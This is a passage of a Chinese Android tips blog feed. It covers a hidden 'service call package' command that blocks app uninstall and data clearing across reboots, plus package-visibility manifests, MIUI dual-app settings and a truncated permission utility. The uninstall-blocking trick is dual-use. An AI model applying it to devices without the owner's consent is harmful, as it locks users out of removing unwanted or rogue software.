0<br>此命令如果返回1，则说明APP已经被设定为无法卸载，返回0则说明APP可以正常被卸载。<br><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"></p><hr><p>想要为多开的APP禁止卸载，只需要将原版禁止卸载的命令的最后一个数字从0改成你的多开用户ID即可。举例，安卓12想要禁止多开的王者荣耀被卸载，需要先查询多开账户ID（常见的多开账户ID为999），然后执行命令：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">136</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">999</span></span><br></pre></td></tr></table></figure><hr><p>文末感谢<a href="http://www.coolapk.com/u/962507" target="_blank" rel="noopener">@sbmatch</a> 告诉我的这个用来禁止卸载的IPackageManager接口函数<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img">另外，此方法禁止APP被卸载的同时还会禁止用户对APP清除数据，并且重启后依然生效。我现在只希望流氓APP们不要看到我这篇动态<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img">🙏🙏</p><hr><p> <strong>补充：</strong> </p><p>有酷友问我安卓14的命令<img src="/img/preloader.gif" data-original="/coolapk-emotion/56_dogexiaoku.gif" alt="img">只能说酷友牛B，目光长远<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/27_qiang.gif" alt="img">安卓14系统的禁止卸载命令依然是仅有一个数字的区别，我直接教大家怎么找到这个数字吧。</p><p>查看安卓源代码中的<br>/frameworks/base/core/java/android/content/pm/IPackageManager.aidl<br>文件，这个文件里面写满了密密麻麻的函数。找到setBlockUninstallForUser函数，记录一下这个函数是第几个函数即可。</p><blockquote><p>转载自酷安<a href="https://www.coolapk.com/feed/43194904?shareKey=NzM0MTQyOWVmYTY3NjNmOWUzNmY~&shareUid=778415&shareFrom=com.coolapk.market_12.5.4" target="_blank" rel="noopener">@无敌战神领主</a> 动态</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓安装调试应用</title>
      <link href="/2023/an-zhuo-an-zhuang-diao-shi-ying-yong/"/>
      <url>/2023/an-zhuo-an-zhuang-diao-shi-ying-yong/</url>
      
        <content type="html"><![CDATA[<p>AndroidStudio打包调试应用时会添加 <code>android:testOnly</code> 导致其他手机没法直接安装  </p><a id="more"></a>  <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>testOnly=<span class="string">"true"</span></span><br></pre></td></tr></table></figure><p>解决方法：安装命令添加 <code>-t</code> </p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb <span class="keyword">install </span>-t <span class="built_in">debug</span>.apk</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android 11 适配 软件包可见性</title>
      <link href="/2023/android-11-gua-pei-ruan-jian-bao-ke-jian-xing/"/>
      <url>/2023/android-11-gua-pei-ruan-jian-bao-ke-jian-xing/</url>
      
        <content type="html"><![CDATA[<h4 id="一、软件包可见性说明"><a href="#一、软件包可见性说明" class="headerlink" title="一、软件包可见性说明"></a>一、软件包可见性说明</h4><p>如果应用以 Android 11（API 级别 30）或更高版本为目标平台，在默认情况下，系统会自动让部分应用对您的应用可见，但会隐藏其他应用。<br>通过让部分应用在默认情况下不可见，系统可以了解应向应用显示哪些其他应用，这样有助于鼓励最小权限原则。  </p><a id="more"></a>  <blockquote><p>注意：  </p><ol><li>如果您的应用以 Android 10（API 级别 29）或更低版本为目标平台，那么全部应用均会自动对您的应用可见。  </li><li>即使您的应用以 Android 11（API 级别 30）或更高版本为目标平台，特定场景不会受影响。  </li></ol></blockquote><h5 id="1-不受影响的特定场景"><a href="#1-不受影响的特定场景" class="headerlink" title="1. 不受影响的特定场景"></a>1. 不受影响的特定场景</h5><ul><li>实现 Android 核心功能的某些系统软件包，如媒体提供程序。</li><li>使用 startActivityForResult() 方法启动其他应用的某个页面。</li><li>通过 Content Provider 访问的应用。</li><li>具有 Content Provider 的任何应用，且应用已被授予 URI 权限来访问该 Content Provider。</li><li>可以使用隐式或显式 intent 来启动另一应用的 activity，无论这个应用是否对您的应用可见。</li></ul><h5 id="2-受影响的方法列表"><a href="#2-受影响的方法列表" class="headerlink" title="2. 受影响的方法列表"></a>2. 受影响的方法列表</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检索可以为给定意图执行的所有 activity</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>query<span class="constructor">IntentActivities(<span class="params">intent</span>, <span class="params">flag</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检索可以匹配给定意图的所有服务</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>query<span class="constructor">IntentServices(<span class="params">intent</span>, <span class="params">flag</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检索可以处理给定意图广播的所有接收器</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>query<span class="constructor">BroadcastReceivers(<span class="params">intent</span>, <span class="params">flag</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询内容提供者</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>query<span class="constructor">ContentProviders(<span class="params">processName</span>, <span class="params">uid</span>, <span class="params">flag</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取为当前用户安装的所有软件包的列表。</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>get<span class="constructor">InstalledPackages(<span class="params">flag</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取已安装的应用程序</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">PackageManager</span>.</span></span>get<span class="constructor">InstalledApplications(<span class="params">flag</span>)</span></span><br></pre></td></tr></table></figure><h4 id="二、软件包可见性配置"><a href="#二、软件包可见性配置" class="headerlink" title="二、软件包可见性配置"></a>二、软件包可见性配置</h4><h5 id="1-检查是否有可用浏览器，例如需要打开外部浏览器"><a href="#1-检查是否有可用浏览器，例如需要打开外部浏览器" class="headerlink" title="1. 检查是否有可用浏览器，例如需要打开外部浏览器"></a>1. 检查是否有可用浏览器，例如需要打开外部浏览器</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.BROWSABLE"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">"https"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-检查设备能否打开给定文件，如需要打开-pdf、zip"><a href="#2-检查设备能否打开给定文件，如需要打开-pdf、zip" class="headerlink" title="2. 检查设备能否打开给定文件，如需要打开 pdf、zip"></a>2. 检查设备能否打开给定文件，如需要打开 pdf、zip</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">"*/*"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="3-创建自定义共享表单，如分享图片、文件"><a href="#3-创建自定义共享表单，如分享图片、文件" class="headerlink" title="3. 创建自定义共享表单，如分享图片、文件"></a>3. 创建自定义共享表单，如分享图片、文件</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.SEND"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">"*/*"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-显示自定义文字选择操作，如选中一段文字，进行复制、粘贴操作"><a href="#4-显示自定义文字选择操作，如选中一段文字，进行复制、粘贴操作" class="headerlink" title="4. 显示自定义文字选择操作，如选中一段文字，进行复制、粘贴操作"></a>4. 显示自定义文字选择操作，如选中一段文字，进行复制、粘贴操作</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.PROCESS_TEXT"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:mimeType</span>=<span class="string">"text/plain"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="5-连接到文字转语音引擎"><a href="#5-连接到文字转语音引擎" class="headerlink" title="5. 连接到文字转语音引擎"></a>5. 连接到文字转语音引擎</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.TTS_SERVICE"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="6-连接到语音识别服务"><a href="#6-连接到语音识别服务" class="headerlink" title="6. 连接到语音识别服务"></a>6. 连接到语音识别服务</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.speech.RecognitionService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="7-显示联系人的自定义数据行"><a href="#7-显示联系人的自定义数据行" class="headerlink" title="7. 显示联系人的自定义数据行"></a>7. 显示联系人的自定义数据行</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Allows the app to read the "contacts.xml" file from the other apps. --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.accounts.AccountAuthenticator"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Allows the app to load an icon corresponding to the custom MIME type. --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.VIEW"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">data</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:host</span>=<span class="string">"com.android.contacts"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:mimeType</span>=<span class="string">"vnd.android.cursor.item/*"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:scheme</span>=<span class="string">"content"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="8-连接到媒体浏览器服务"><a href="#8-连接到媒体浏览器服务" class="headerlink" title="8. 连接到媒体浏览器服务"></a>8. 连接到媒体浏览器服务</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.media.browse.MediaBrowserService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="9-配置访问-微信，支付宝，QQ，微博"><a href="#9-配置访问-微信，支付宝，QQ，微博" class="headerlink" title="9. 配置访问 微信，支付宝，QQ，微博"></a>9. 配置访问 微信，支付宝，QQ，微博</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">queries</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--微信--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"com.tencent.mm"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--支付宝--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"com.eg.android.AlipayGphone"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"hk.alipay.wallet"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--QQ--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"com.tencent.qqlite"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"com.tencent.mobileqq"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--新浪微博--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">android:name</span>=<span class="string">"com.sina.weibo"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">queries</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="10-配置查询所有应用及与之交互（以上均可不配置，但-gp-会严格审核）"><a href="#10-配置查询所有应用及与之交互（以上均可不配置，但-gp-会严格审核）" class="headerlink" title="10. 配置查询所有应用及与之交互（以上均可不配置，但 gp 会严格审核）"></a>10. 配置查询所有应用及与之交互（以上均可不配置，但 gp 会严格审核）</h5><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="built_in">name</span>=<span class="string">"android.permission.QUERY_ALL_PACKAGES"</span> /&gt;</span><br></pre></td></tr></table></figure><h4 id="附-Github-源码："><a href="#附-Github-源码：" class="headerlink" title="附 Github 源码："></a>附 Github 源码：</h4><p><a href="https://github.com/WeiLianYang/EasyKotlin/blob/master/app/src/main/AndroidManifest.xml" target="_blank" rel="noopener">AndroidManifest.xml</a></p><p>转载自Lucky_William：<a href="https://blog.csdn.net/java_android_man/article/details/122133434" target="_blank" rel="noopener">https://blog.csdn.net/java_android_man/article/details/122133434</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设置MIUI双开默认打开主应用</title>
      <link href="/2023/she-zhi-miui-shuang-kai-mo-ren-da-kai-zhu-ying-yong/"/>
      <url>/2023/she-zhi-miui-shuang-kai-mo-ren-da-kai-zhu-ying-yong/</url>
      
        <content type="html"><![CDATA[<p>MIUI开启应用双开后，其他应用想要打开对应应用时系统会弹窗让选择主应用还是双开应用，小米提供的默认应用选择只有几个固定的打开方式，并不能满足需求，可以通过下面方法改变默认应用  </p><a id="more"></a>  <p>设置默认打开方法</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">settings put secure Activity <span class="number">1</span></span><br></pre></td></tr></table></figure><p>Activity：是想要打开的活动(Activity)<br>最后的数字：0为每次询问，1为主应用，2为双开应用  </p><p>调用微信内置浏览器时默认使用主微信的内置浏览器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">settings</span> <span class="selector-tag">put</span> <span class="selector-tag">secure</span> <span class="selector-tag">com</span><span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.webview</span><span class="selector-class">.ui</span><span class="selector-class">.tools</span><span class="selector-class">.WebViewUI</span> 1</span><br></pre></td></tr></table></figure><p><a href="/2021/open-with/">调用软件内置浏览器</a></p><p>方法来源<a href="https://www.coolapk.com/feed/43450510?shareKey=ZTA1YzNkOWIzYjVhNjNmMTM1ODU~&shareUid=778415&shareFrom=com.coolapk.market_12.5.4" target="_blank" rel="noopener">酷安@小鸠下汐</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Mrp工具 读取mrp信息</title>
      <link href="/2023/mrp-gong-ju/"/>
      <url>/2023/mrp-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>用于java中的mrp工具库MrpUtils  </p><a id="more"></a>  <p>jar是由天使之翼制作<br>jar下载: <a href="MrpUtils.jar">MrpUtils.jar</a>  </p><p>简单使用：</p><p>判断是不是mrp文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MrpUtils.MrpInfo readMrpInfo = <span class="module-access"><span class="module"><span class="identifier">MrpUtils</span>.</span></span>read<span class="constructor">MrpInfo(<span class="params">path</span>)</span>;</span><br><span class="line"><span class="keyword">if</span>(!readMrpInfo.suc)&#123;</span><br><span class="line"> show<span class="constructor">Error(<span class="string">"当前文件不是mrp"</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体源码查看<a href="https://github.com/Yichou/mrpoid2018" target="_blank" rel="noopener">mrpoid开源项目</a>  </p><p><a href="/2021/java-huo-qu-mrp-xin-xi/">Java获取Mrp信息</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>AndroidSupport中的运行时权限</title>
      <link href="/2023/androidsupport-zhong-de-yun-xing-shi-quan-xian/"/>
      <url>/2023/androidsupport-zhong-de-yun-xing-shi-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>support库中运行时权限的部分，在aide中使用时可以不用引入整个support库，压缩apk体积  </p><a id="more"></a>  <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Handler;</span><br><span class="line"><span class="keyword">import</span> android.os.Looper;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"><span class="keyword">import</span> android.support.annotation.IntRange;</span><br><span class="line"><span class="keyword">import</span> android.support.annotation.NonNull;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">PermissionUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment"><span class="markdown">/**</span></span></span><br><span class="line"><span class="comment"><span class="markdown"><span 